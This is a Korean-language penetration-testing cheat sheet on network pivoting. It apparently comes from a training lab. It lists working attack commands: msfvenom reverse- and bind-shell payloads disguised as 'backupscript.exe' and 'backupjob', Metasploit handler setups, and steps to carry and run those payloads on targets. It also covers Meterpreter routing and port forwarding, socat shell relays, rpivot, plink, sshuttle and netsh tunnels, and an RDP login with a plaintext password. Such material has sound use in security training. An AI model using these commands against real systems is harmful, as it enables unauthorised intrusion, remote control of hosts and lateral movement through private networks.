# 1. SSH 및 SOCKS 터널링

### SSH로 로컬 포트 포워딩
```ssh -L 1234:localhost:3306 <user>@192.168.1.1```

### SSH로 다중 포트 포워딩
```ssh -L 1234:localhost:3306 -L 8080:localhost:80 <user>@192.168.1.1```

### SSH로 동적 포트 포워딩
```ssh -D 9050 <user>@192.168.1.1```

### /etc/proxychains.conf 확인
```
tail -4 /etc/proxychains.conf

# meanwile
# defaults set to "tor"
socks4 	127.0.0.1 9050
```

### Proxychains와 함께 Nmap 사용
```proxychains nmap -v -sn 172.16.5.1-200```

<br/><br/>
# 2. SSH를 사용한 원격/역방향 포트 포워딩

### msfvenom을 사용하여 Windows 페이로드 생성
```msfvenom -p windows/x64/meterpreter/reverse_https lhost= <InternalIPofPivotHost> -f exe -o backupscript.exe LPORT=8080```

### 멀티/핸들러 구성 및 시작
```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
msf6 exploit(multi/handler) > run
```

### Pivot Host로 페이로드 전송
```scp backupscript.exe <user>@<ipAddressofTarget>:~/```

### Pivot Host에서 Python3 웹 서버 시작
```python3 -m http.server 8123```

### Windows Target에서 페이로드 다운로드
```Invoke-WebRequest -Uri "http://<InternalIPofPivotHost>:8123/backupscript.exe" -OutFile "C:\backupscript.exe"```

### SSH -R로 원격 포트 포워딩
```ssh -R <InternalIPofPivotHost>:8080:0.0.0.0:8000 <user>@<ipAddressofTarget> -vN```

<br/><br/>
# 3. Meterpreter 터널링 및 포트 포워딩

### Ubuntu Pivot 호스트를 위한 페이로드 생성
```msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<UbuntuipAddress> -f elf -o backupjob LPORT=8080```

### 멀티/핸들러 구성 및 시작
```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 8080
msf6 exploit(multi/handler) > set payload linux/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > run
```

### Pivot Host로 페이로드 실행
```
chmod +x backupjob
./backupjob
```

### meterpreter에서 Ping Sweep
```meterpreter > run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23```

### Linux Pivot 호스트에서 Ping Sweep
```for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done```

### CMD를 사용한 Ping Sweep
```for /L %i in (1 1 254) do ping 172.16.5.%i -n 1 -w 100 | find "Reply"```

### PowerShell을 사용한 Ping Sweep
```1..254 | % {"172.16.5.$($_): $(Test-Connection -count 1 -comp 172.15.5.$($_) -quiet)"}```

### MSF의 SOCKS 프록시 구성
```
msf6 > use auxiliary/server/socks_proxy
msf6 auxiliary(server/socks_proxy) > set SRVPORT 9050
msf6 auxiliary(server/socks_proxy) > set SRVHOST 0.0.0.0
msf6 auxiliary(server/socks_proxy) > set version 4a
msf6 auxiliary(server/socks_proxy) > run
msf6 auxiliary(server/socks_proxy) > jobs
프록시 서버 실행중인지 확인
```

### AutoRoute로 경로 생성
```
msf6 > use post/multi/manage/autoroute
msf6 post(multi/manage/autoroute) > set SESSION 1
msf6 post(multi/manage/autoroute) > set SUBNET 172.16.5.0
msf6 post(multi/manage/autoroute) > run
```
다른 방법 : ```meterpreter > run autoroute -s 172.16.5.0/23```

### AutoRoute를 사용하여 활성 경로 나열
```meterpreter > run autoroute -p```

<br/><br/>
## 포트 포워딩

### 로컬 TCP 릴레이 생성
```meterpreter > portfwd add -l 3300 -p 3389 -r 172.16.5.19```

### localhost를 통해 Windows Target에 연결
```xfreerdp /v:localhost:3300 /u:victor /p:pass@123```

<br/><br/>
## Meterpreter Reverse 포트 포워딩

### Reverse 포트 포워딩
```meterpreter > portfwd add -R -l 8081 -p 1234 -L 10.10.14.18```

### 멀티/핸들러 구성 및 시작
```
meterpreter > bg

msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set LPORT 8081 
msf6 exploit(multi/handler) > set LHOST 0.0.0.0 
msf6 exploit(multi/handler) > run
```

### Windows 페이로드 생성
```msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234```

<br/><br/>
# 4. Socat 활용

## Reverse Shell을 통한 Socat Redirection

### Socat 리스너 시작
```socat TCP4-LISTEN:8080,fork TCP4:10.10.14.18:80```

### Windows 페이로드 생성
```msfvenom -p windows/x64/meterpreter/reverse_https LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=8080```

### 멀티/핸들러 구성 및 시작
```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
msf6 exploit(multi/handler) > set lport 80
msf6 exploit(multi/handler) > run
```

<br/><br/>
## Bind Shell을 통한 Socat Redirection

### Windows 페이로드 생성
```msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupscript.exe LPORT=8443```

### Socat Bind Shell Listener 시작
```socat TCP4-LISTEN:8080,fork TCP4:172.16.5.19:8443```

### Bind 멀티/핸들러 구성 및 시작
```
msf6 > use exploit/multi/handler
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/bind_tcp
msf6 exploit(multi/handler) > set RHOST 10.129.202.64
msf6 exploit(multi/handler) > set LPORT 8080
msf6 exploit(multi/handler) > run
```

<br/><br/>
# Pivoting

## Windows용 SSH (plink.exe)

### Plink.exe 사용
```plink -ssh -D 9050 ubuntu@10.129.15.50```

<br/><br/>
## Sshuttle을 사용한 SSH Pivoting

### sshuttle 실행
```sshuttle -r ubuntu@10.129.202.64 172.16.5.0/23 -v```

<br/><br/>
## Rpivot을 사용한 웹 서버 Pivoting

### rpivot 복제 및 python2.7 설치
```git clone https://github.com/klsecservices/rpivot.git```
```
sudo apt-get install python2.7
curl https://pyenv.run | bash
echo 'export PYENV_ROOT="$HOME/.pyenv"' >> ~/.bashrc
echo 'command -v pyenv >/dev/null || export PATH="$PYENV_ROOT/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(pyenv init -)"' >> ~/.bashrc
source ~/.bashrc
pyenv install 2.7
pyenv shell 2.7
```

### 공격 호스트에서 server.py 실행
```python2.7 server.py --proxy-port 9050 --server-port 9999 --server-ip 0.0.0.0```

### rpivot을 타겟으로 전송
```scp -r rpivot ubuntu@<IpaddressOfTarget>:/home/ubuntu/```

### Pivot Target에서 client.py 실행
```python2.7 client.py --server-ip 10.10.14.18 --server-port 9999```

### Proxychains를 사용하여 대상 웹 서버 탐색
```proxychains firefox-esr 172.16.5.135:80```

### HTTP-Proxy 및 NTLM 인증을 사용하여 웹 서버에 연결
```python client.py --server-ip <IPaddressofTargetWebServer> --server-port 8080 --ntlm-proxy-ip <IPaddressofProxy> --ntlm-proxy-port 8081 --domain <nameofWindowsDomain> --username <username> --password <password>```

<br/><br/>
## Windows Netsh를 사용한 포트 포워딩

### Netsh.exe를 사용하여 포트 포워딩
```C:\Windows\system32> netsh.exe interface portproxy add v4tov4 listenport=8080 listenaddress=10.129.15.150 connectport=3389 connectaddress=172.16.5.25```

### 포트 포워딩 확인
```netsh.exe interface portproxy show v4tov4```










